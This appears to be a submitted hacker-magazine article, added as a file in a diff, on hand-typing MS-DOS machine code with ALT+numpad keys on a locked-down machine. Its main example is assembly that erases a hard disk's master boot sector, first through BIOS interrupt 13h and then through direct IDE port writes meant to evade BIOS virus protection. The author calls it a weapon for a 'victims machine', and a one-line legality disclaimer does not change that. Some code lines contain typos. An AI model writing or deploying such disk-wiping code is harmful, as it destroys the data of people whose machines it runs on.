@@ -1,0 +1,189 @@
+I want to submit an article. 
+
+ Title: Programming in extreme conditions
+ Author: Kalmykov.b52
+ Attachment: xtream.txt
+
+ Please let me know your if you consider it or not.
+ (e-mail b52x@mail.ru)
+
+ Thank you !
+
+
+
+
+ PROGRAMMING IN EXTREME CONDITIONS
+
+ INTRODUCTION
+
+ What is 'extreme conditions' ? When you are sitting in front of a computer with
+ only MS-DOS installed without any compilers, hex editors, shells, debuggers and
+ you need to recover lost data, delete virus, or write a new one. This is an
+ extreme conditions. Most of programmers won't be able to do anything, most of
+ administrators think that this computer is 100% secured.But this won't stop the
+ assembler programmer ...
+ I have chosen pure MS-DOS as the operation system to program for because in
+ Windows there are many things that will easier this task (e.g. in Windows 98
+ there is-built in browser with VBScript and Java Script interpretators so you
+ can easy write a hex-editor and more).
+ This article will be interesting as for the beginners and experienced
+ programmers. Also I recommend it to hackers, administrators, and anybody who
+ wants to feel the spirit of low-level programming, which now is disappearing
+ with the previous programmers generation generation.
+
+ THE BEGINNING
+
+ To read and understand this you will need this minimum: the knowledge of
+ Assembler, experience working with MS-DOS. Also you will need the list of x86
+ instructions opcodes, ASCII table, and lot of free time. First of all, we need
+ some kind of text editor. But the administrator removed EVERYTHING that could
+ help us. There is only one thing that differs a good programmer from any other-
+ It's the deep knowledge of everything he works with. If works with DOS he knows
+ everything about it. There is undocumented functions that opens a tiny text
+ editor, but that's enough. Enter this DOS command:
+
+ C:\copy con test.com
+
+ You will run the text editor. This is our instrument. But we still don't know
+ how to write binaries. If you will look to official MS-DOS manual, you'll find
+ the answer. Using ALT key and the numeric keyboard you can create binaries.
+ First of all check if the NUMlock is on. Now press ALT, type 195, now release
+ ALT. To save file and exit press CTRL-Z and hit enter. Now run it. It doesn't
+ do anything but it doesn't halt the system. If you disassemble it you will find
+ that test.com consists of only one operand RETN. As you already guessed opcode
+ of RETN (195 == 0xC3), and in decimal it is 195.
+
+ ADVANCED
+
+ Well, It was easy. Now try to enter this:
+
+ ALT-180 ALT-09 ALT-186 ALT-09 ALT-01 ALT-205 ! ALT-195 ALT 32 Hi,world!$
+
+ Than press CTRL-Z and hit enter. It is clear that this program that prints
+ "Hi,world!". Let's disassemble it:
+
+ 49E0:0100                       start:
+ 49E0:0100  B4 09                               mov     ah,9
+ 49E0:0102  BA 0109                             mov     dx,offset data_1
+ 49E0:0105  CD 21                               int     21h ; DOS Services
+                                                            ; ah=function 09h
+                                                            ; display char string
+                                                            ;at ds:dx
+ 49E0:0107  C3                                   retn
+ 49E0:0108  20                                   db      20h
+ 49E0:0109  48 69 20 21 21 21    data_1          db      'Hi,world!$
+                                                         ;xref 49E0:0102
+
+ I hope you know about the reversed order in machine word (ALT-09 ALT-01 = 109).
+ Also, in order to show the beauty of this method, I used symbol '!' == 0x21 to
+ call interrupt 0x21. So knowing ASCII codes can easier your life. But why we
+ need this symbol (20h == ALT-32 == " ") at 49E0:0108 ?
+ This is the main problem of this method. Using ALT and numeric keyboard we
+ cannot enter some symbols. Here is a list of them:
+
+          0,3,6,8,16(0x10),19(0x13),27(0x1b),255(0xFF)
+
+ You will need to avoid this symbols. If you look at the code, you'll see that
+ the real offset is 0x108. After adding a symbol the offset became 0x109.
+ Actually there is more elegant way to do it:
+
+        mov    dx,109
+        dec    sx
+
+ These two variants are equal (dec dx == 1 byte) and you chose what suits you
+ best. Another problem is finding offset of variables and labels. You can write
+ program on the paper, giving to variables symbolic names, and then the
+ program will be ready it will be easy to find necessary offsets and address.
+ Another possibility is declaring all variables before their usage:
+
+        mov      ah,9
+        jmp      sort $+20
+        db       'Hi,world!'$
+        mov      dx,0x100+2+2; 0x100 - the base adress,2 - lengh of
+                             ; mov  ah,9, 2 - lengh of jmp
+
+ jmp short $+20 - reserves 20 bytes for the string. This method could be also
+ used for labels.
+
+ THE EXAMPLE
+
+ I think you are tired of these theoretical programming and feel ready to see this
+ method in work. As illustration we will to create a program that erases the
+ boot sector. Attention ! The usage of this program in order to destroy
+ information is a crime. You should use it only for experimental purpose.
+
+ First of all, let's write it on assembler:
+
+ B80103   mov   ax,00301
+ B90100   mov   cx,00001
+ BA8000   mov   dx,00080
+ CD13     int   013
+ C3       retn
+
+ As you see we have one #0 and two #3. Let's modify the program to avoid them:
+
+          xor ax,ax
+          mov ds,ax
+          mov   ax,00299
+          inc   ax
+          inc   ax
+          xor   cx,cx
+          inc   cx
+          mov   dl,80
+          mov bx,13h*4
+          pushf
+          cli
+          push cs
+          call dword ptr [bx]
+          retn
+
+ Maybe it's quite a hard example. The assembler programming and interrupts
+ are not really the subject of this article. I can only forward you to the other
+ references that you can easily find on the Internet. Fortunately
+ (or unfortunately, depends on readers orientation), in BIOS there is a boot
+ write protection (sometimes it's called "Virus warning").It will block any
+ efforts to modify the main boot sector.
+
+ For example, running this program under Windows 98 operation system will take
+ no effect. But we still can work with hard drive I/O ports on a low-level.
+ Here is an example of program that will erase main boot sector, through hard
+ drive I/O ports:
+
+          mov dx, 1F2h
+          mov al,1
+          out dx,al
+          inc dx
+          out dx,al
+          inc dx
+          xor ax,ax
+          out dx,al
+          inc dx
+          out dx,al
+          mov al, 10100000b
+          inc dx
+          out dx,al
+          inc dx
+          mov al,30h
+          out dx,al
+          lea si, Buffer
+          mov dx, 1F0h
+          mov cx, 513
+          rep outsw
+
+ I don't know any popular protection that can track and block that program.
+ However, that doesn't refer to Windows NT, this OS won't allow any program
+ without necessary privileges to work with ports, even more it will close
+ the application's window. Preparing this example for entering it using ALT
+ and optimizing It's size I will leave as an exercise to the readers.That's all:
+ enter this in victims machine and you have powerful weapon. I recommend to use
+ it very carefully.
+
+ ENDING
+
+ It's not easy. All this requires a lot of experience and talent but gives you
+ incredible power on machine(and i hope you won't be using this power for
+ destruction). All this looks quite unuseful, you can say that you won't need
+ it - but who knows?.. Nowdays programmer depends on the powerfull development
+ tools (compilers, debuggers, editors) and when he stay alone with 'nature'
+ he cannot control the situation anymore - he cannot control the 
+ machine ...
